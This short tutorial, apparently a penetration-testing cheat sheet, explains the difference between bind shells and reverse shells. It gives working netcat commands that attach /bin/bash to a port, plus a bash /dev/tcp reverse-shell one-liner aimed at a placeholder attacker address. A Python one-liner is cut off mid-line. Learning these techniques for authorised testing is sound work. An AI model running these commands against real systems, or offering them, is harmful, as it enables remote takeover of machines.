# Bind shell vs Reverse shell — short & easy

**Bind shell (target listens)**

- The *target* opens a listening port and waits for an incoming connection.
- Attacker connects to that port and gains a shell.
- Good when the target is directly reachable (no NAT/firewall blocking inbound).
- Who listens: **target**.
- Basic Netcat example (may require a netcat variant that supports `e`):

Target (victim) — runs:

```bash
# target: listen on port 4444 and give a shell
nc -lvnp 4444 -e /bin/bash

```

Attacker — connects:

```bash
# attacker: connect to target
nc TARGET_IP 4444

```

---

**Reverse shell (attacker listens)**

- The *attacker* opens a listening port; the *target* connects back to the attacker and provides a shell.
- Works well when the target is behind NAT/firewall (outbound traffic usually allowed).
- Who listens: **attacker**.
- Typical and more reliable for real-world tests.

Attacker — listens:

```bash
nc -lvnp 4444

```

Target — connects back (netcat `-e` variant):

```bash
nc ATTACKER_IP 4444 -e /bin/bash

```

If `nc -e` isn’t available, use a bash one-liner:

```bash
# bash reverse shell
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

```

Or a Python one-liner:

```bash
python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connec

```
